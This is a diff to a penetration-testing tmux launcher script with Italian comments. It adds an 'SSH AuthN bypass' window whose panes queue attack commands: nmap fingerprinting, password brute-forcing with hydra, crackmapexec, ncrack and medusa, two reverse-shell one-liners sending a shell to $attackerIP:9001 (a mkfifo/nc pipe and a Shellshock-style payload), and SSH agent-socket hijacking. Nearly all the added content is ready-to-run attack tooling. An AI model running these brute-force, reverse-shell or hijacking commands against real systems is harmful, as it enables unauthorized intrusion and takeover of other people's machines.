@@ -1625,8 +1625,43 @@ tmux send-keys -t PT:2.10 "# GIT: navigate the repository versioning" Enter
 tmux send-keys -t PT:2.10 "git diff <UUID commit>"
 tmux send-keys -t PT:2.11 "# GIT: navigate the repository versioning" Enter
 tmux send-keys -t PT:2.11 "git reset --hard <UUID commit>"
-
 cd $folderProject
+
+cd $folderProjectAuthN
+# SSH
+tmux new-window -t PT:3 -n 'Service AuthN bypass: SSH'
+tmux split-window -v -t PT:3.0
+tmux split-window -v -t PT:3.1
+tmux select-pane -t "3.1"
+tmux split-window -h -t "3.1"
+tmux split-window -h -t "3.1"
+tmux split-window -h -t "3.1"
+tmux split-window -h -t "3.1"
+tmux split-window -v -t PT:3.6
+tmux select-pane -t "3.6"
+tmux split-window -h -t "3.6"
+tmux split-window -v -t PT:3.7
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:3.0 "# SSH Service fingerprint" Enter
+tmux send-keys -t PT:3.0 "nmap -sV -Pn -vv -p 22 --script=ftp* $ip -oA out.22"
+tmux send-keys -t PT:3.1 "# SSH bruteforce attack" Enter
+tmux send-keys -t PT:3.1 "find /usr/share/seclists/ -follow | grep pass | xargs wc -l | sort -n"
+tmux send-keys -t PT:3.2 "# SSH bruteforce attack" Enter
+tmux send-keys -t PT:3.2 "hydra -L users.txt -P password.txt ssh://$ip"
+tmux send-keys -t PT:3.3 "# SSH bruteforce attack" Enter
+tmux send-keys -t PT:3.3 "crackmapexec ssh $ip -u users.txt -p pass.txt "
+tmux send-keys -t PT:3.4 "# SSH bruteforce attack" Enter
+tmux send-keys -t PT:3.4 "ncrack -p 22 -U users.txt -P passwords.txt $ip [-T 5]"
+tmux send-keys -t PT:3.5 "# SSH bruteforce attack" Enter
+tmux send-keys -t PT:3.5 "medusa -U users.txt -P passwords.txt -h $ip -M ssh"
+tmux send-keys -t PT:3.6 "# SSH blocked bypass calling attackerIP:9001" Enter
+tmux send-keys -t PT:3.6 "ssh <USER>@$ip 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $attackerIP 9001 >/tmp/f'"
+tmux send-keys -t PT:3.7 "# SSH blocked bypass calling attackerIP:9001" Enter
+tmux send-keys -t PT:3.7 "ssh <USER>@$ip '() { :;}; /bin/nc -nv $attackerIP 9001 -e /bin/bash'"
+tmux send-keys -t PT:3.8 "# SSH Hijacking" Enter
+tmux send-keys -t PT:3.8 "SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh root@<TARGET_IP> -p <TARGET_PORT>"
+cd $folderProject
+
 
 
 # Attivazione della modalità interattiva
